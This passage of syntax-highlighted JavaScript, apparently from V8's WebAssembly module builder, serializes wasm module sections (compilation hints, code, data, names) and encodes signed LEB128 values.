            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting compilation hints @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// Build custom section payload.</span>
            <span class="token keyword">let</span> payloadBinary <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Binary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">let</span> implicit_compilation_hints_count <span class="token operator">=</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
            payloadBinary<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>implicit_compilation_hints_count<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// Defaults to the compiler's choice if no better hint was given (0x00).</span>
            <span class="token keyword">let</span> defaultHintByte <span class="token operator">=</span>
              kCompilationHintStrategyDefault <span class="token operator">|</span>
              <span class="token punctuation">(</span>kCompilationHintTierDefault <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span>
              <span class="token punctuation">(</span>kCompilationHintTierDefault <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// Emit hint byte for every function defined in this module.</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> implicit_compilation_hints_count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              <span class="token keyword">let</span> index <span class="token operator">=</span> wasm<span class="token punctuation">.</span>num_imported_funcs <span class="token operator">+</span> i<span class="token punctuation">;</span>
              <span class="token keyword">var</span> hintByte<span class="token punctuation">;</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token keyword">in</span> wasm<span class="token punctuation">.</span>compilation_hints<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">let</span> hint <span class="token operator">=</span> wasm<span class="token punctuation">.</span>compilation_hints<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
                hintByte <span class="token operator">=</span>
                  hint<span class="token punctuation">.</span>strategy <span class="token operator">|</span>
                  <span class="token punctuation">(</span>hint<span class="token punctuation">.</span>baselineTier <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span>
                  <span class="token punctuation">(</span>hint<span class="token punctuation">.</span>topTier <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                hintByte <span class="token operator">=</span> defaultHintByte<span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
              payloadBinary<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>hintByte<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token comment">// Finalize as custom section.</span>
            <span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">"compilationHints"</span><span class="token punctuation">;</span>
            <span class="token keyword">let</span> bytes <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">createCustomSection</span><span class="token punctuation">(</span>
              name<span class="token punctuation">,</span>
              payloadBinary<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add function bodies.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// emit function bodies</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting code @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">let</span> section_length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kCodeSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>functions<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">let</span> header<span class="token punctuation">;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> func <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  <span class="token comment">// Fast path for functions without locals.</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>body<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0 locals.</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                  <span class="token comment">// Build the locals declarations in separate buffer first.</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>header<span class="token punctuation">)</span> header <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Binary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  header<span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  header<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> decl <span class="token keyword">of</span> func<span class="token punctuation">.</span>locals<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    header<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>decl<span class="token punctuation">.</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    header<span class="token punctuation">.</span><span class="token function">emit_type</span><span class="token punctuation">(</span>decl<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>header<span class="token punctuation">.</span>length <span class="token operator">+</span> func<span class="token punctuation">.</span>body<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>header<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token comment">// Set to section offset for now, will update.</span>
                func<span class="token punctuation">.</span>body_offset <span class="token operator">=</span> section<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
              section_length <span class="token operator">=</span> section<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> func <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
              func<span class="token punctuation">.</span>body_offset <span class="token operator">+=</span> binary<span class="token punctuation">.</span>length <span class="token operator">-</span> section_length<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add data segments.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting data segments @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kDataSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>data_segments<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> seg <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>data_segments<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>seg<span class="token punctuation">.</span>is_active<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span>seg<span class="token punctuation">.</span>mem_index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kActiveNoIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kActiveWithIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>seg<span class="token punctuation">.</span>mem_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span>seg<span class="token punctuation">.</span>is_global<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">// Offset is taken from a global.</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kExprGlobalGet<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>seg<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">// Offset is a constant.</span>
                    section<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span><span class="token function">wasmI32Const</span><span class="token punctuation">(</span>seg<span class="token punctuation">.</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kExprEnd<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                  section<span class="token punctuation">.</span><span class="token function">emit_u8</span><span class="token punctuation">(</span>kPassive<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>seg<span class="token punctuation">.</span>data<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>seg<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add any explicitly added sections.</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> exp <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>explicit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting explicit @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_bytes</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token comment">// Add names.</span>
          <span class="token keyword">let</span> num_function_names <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> num_functions_with_local_names <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> func <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">.</span>name <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token operator">++</span>num_function_names<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">.</span><span class="token function">numLocalNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">++</span>num_functions_with_local_names<span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>
            num_function_names <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span>
            num_functions_with_local_names <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span>
            wasm<span class="token punctuation">.</span>name <span class="token operator">!==</span> <span class="token keyword">undefined</span>
          <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>debug<span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"emitting names @ "</span> <span class="token operator">+</span> binary<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
            binary<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kUnknownSectionCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
              section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token comment">// Emit module name.</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>name <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kModuleNameCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">name_section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                  name_section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>wasm<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
              <span class="token comment">// Emit function names.</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>num_function_names <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kFunctionNamesCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">name_section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                  name_section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>num_function_names<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> func <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">.</span>name <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
                    name_section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    name_section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
              <span class="token comment">// Emit local names.</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>num_functions_with_local_names <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                section<span class="token punctuation">.</span><span class="token function">emit_section</span><span class="token punctuation">(</span>kLocalNamesCode<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">name_section</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
                  name_section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>num_functions_with_local_names<span class="token punctuation">)</span><span class="token punctuation">;</span>
                  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> func <span class="token keyword">of</span> wasm<span class="token punctuation">.</span>functions<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>func<span class="token punctuation">.</span><span class="token function">numLocalNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
                    name_section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    name_section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span><span class="token function">numLocalNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">let</span> name_index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> func<span class="token punctuation">.</span>local_names<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> func<span class="token punctuation">.</span>local_names<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        name_section<span class="token punctuation">.</span><span class="token function">emit_u32v</span><span class="token punctuation">(</span>name_index<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        name_section<span class="token punctuation">.</span><span class="token function">emit_string</span><span class="token punctuation">(</span>func<span class="token punctuation">.</span>local_names<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        name_index<span class="token operator">++</span><span class="token punctuation">;</span>
                      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                        name_index <span class="token operator">+=</span> func<span class="token punctuation">.</span>local_names<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                      <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                  <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">return</span> binary<span class="token punctuation">.</span><span class="token function">trunc_buffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">toArray</span><span class="token punctuation">(</span><span class="token parameter">debug <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toBuffer</span><span class="token punctuation">(</span>debug<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token parameter">ffi<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">let</span> module <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toModule</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">let</span> instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Instance</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> ffi<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> instance<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">asyncInstantiate</span><span class="token punctuation">(</span><span class="token parameter">ffi</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> WebAssembly<span class="token punctuation">.</span><span class="token function">instantiate</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ffi<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>
            <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span> module<span class="token punctuation">,</span> instance <span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> instance
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">toModule</span><span class="token punctuation">(</span><span class="token parameter">options<span class="token punctuation">,</span> debug <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">WebAssembly<span class="token punctuation">.</span>Module</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toBuffer</span><span class="token punctuation">(</span>debug<span class="token punctuation">)</span><span class="token punctuation">,</span> options<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span><span class="token parameter">val<span class="token punctuation">,</span> max_len <span class="token operator">=</span> <span class="token number">5</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Leb value may not be null/undefined"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> max_len<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">let</span> v <span class="token operator">=</span> val <span class="token operator">&amp;</span> <span class="token number">0x7f</span><span class="token punctuation">;</span>
          <span class="token comment">// If &#123;v&#125; sign-extended from 7 to 32 bits is equal to val, we are done.</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>v <span class="token operator">&lt;&lt;</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">25</span> <span class="token operator">==</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> res<span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>v <span class="token operator">|</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          val <span class="token operator">=</span> val <span class="token operator">>></span> <span class="token number">7</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span>
          <span class="token string">"Leb value &lt;"</span> <span class="token operator">+</span> val <span class="token operator">+</span> <span class="token string">"> exceeds maximum length of "</span> <span class="token operator">+</span> max_len
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">function</span> <span class="token function">wasmSignedLeb64</span><span class="token punctuation">(</span><span class="token parameter">val<span class="token punctuation">,</span> max_len <span class="token operator">=</span> <span class="token number">10</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Leb value may not be null/undefined"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> val <span class="token operator">!=</span> <span class="token string">"bigint"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">&lt;</span> Math<span class="token punctuation">.</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token function">wasmSignedLeb</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> max_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
          val <span class="token operator">=</span> <span class="token function">BigInt</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> max_len<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">let</span> v <span class="token operator">=</span> val <span class="token operator">&amp;</span> <span class="token number">0x7fn</span><span class="token punctuation">;</span>
